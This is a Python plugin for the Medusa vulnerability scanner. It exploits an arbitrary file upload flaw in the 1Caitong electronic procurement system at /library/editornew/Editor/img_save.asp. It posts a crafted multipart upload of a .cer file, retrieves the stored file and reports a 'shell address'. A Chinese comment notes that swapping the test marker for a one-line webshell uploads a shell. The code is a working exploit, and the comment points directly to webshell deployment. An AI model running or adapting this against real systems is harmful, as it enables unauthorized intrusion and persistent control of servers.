#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
注意！只能对oracle数据库起作用
'''
__author__ = 'Ascotbe'
__times__ = '2019/10/13 22:12 PM'
import urllib.parse
import requests
import re
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['createDate'] = "2020-1-5"  # 插件编辑时间
        self.info['disclosure']='2015-11-07'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "OneCaitongElectronicProcurementSystemUploadsArbitraryFiles2"  # 插件名称
        self.info['name'] ='一采通电子采购系统任意文件上传' #漏洞名称
        self.info['affects'] = "1Caitong"  # 漏洞组件
        self.info['desc_content'] = "/library/editornew/Editor/img_save.asp位置存在任意文件上传"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "暂无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload = "/library/editornew/Editor/img_save.asp"
        payload_url = scheme + "://" + url +":"+ str(port)+ payload
        data = '''
                        ------WebKitFormBoundaryNjZKAB66SVyL1INA
                        Content-Disposition: form-data; name="img_src"; filename="123.cer"
                        Content-Type: application/x-x509-ca-cert

                        testvul
                        ------WebKitFormBoundaryNjZKAB66SVyL1INA
                        Content-Disposition: form-data; name="Submit"

                        提交
                        ------WebKitFormBoundaryNjZKAB66SVyL1INA
                        Content-Disposition: form-data; name="img_alt"


                        ------WebKitFormBoundaryNjZKAB66SVyL1INA
                        Content-Disposition: form-data; name="img_align"

                        baseline
                        ------WebKitFormBoundaryNjZKAB66SVyL1INA
                        Content-Disposition: form-data; name="img_border"


                        ------WebKitFormBoundaryNjZKAB66SVyL1INA
                        Content-Disposition: form-data; name="newid"

                        45
                        ------WebKitFormBoundaryNjZKAB66SVyL1INA
                        Content-Disposition: form-data; name="img_hspace"


                        ------WebKitFormBoundaryNjZKAB66SVyL1INA
                        Content-Disposition: form-data; name="img_vspace"


                        ------WebKitFormBoundaryNjZKAB66SVyL1INA--
                        '''

        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        s = requests.session()
        # if ProxyIp!=None:
        #     proxies = {
        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
        #         "http": "http://" + str(ProxyIp)
        #     }
        #     resp = s.post(payload_url,data=data,headers=headers, timeout=6, proxies=proxies,verify=False)
        # elif ProxyIp==None:
        resp = s.post(payload_url,data=data,headers=headers, timeout=6, verify=False)
        con = resp.text
        match = re.search(r'getimg\(\'([\d]+.cer)\'\)', con)
        if match:
            payload_url2 = scheme + "://" + url + ":" + str(port) + "/library/editornew/Editor/NewImage/"+match.group(1)
            resp2 = s.get(payload_url2, headers=headers, timeout=6, verify=False)
            con2 = resp2.text
            code2 = resp2.status_code
            #如果要上传shell直接把testvul这个值改为一句话就可以
            if code2 == 200 and con2.lower().find("testvul") != -1:
                Medusa = "{}存在一采通电子采购系统任意文件上传漏洞\r\n 验证数据:\r\nshell地址:{}\r\n内容:{}\r\n".format(url,payload_url2,con2)
                _t=VulnerabilityInfo(Medusa)
                web=ClassCongregation.VulnerabilityDetails(_t.info)
                web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
                return (str(_t.info))
    except Exception:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名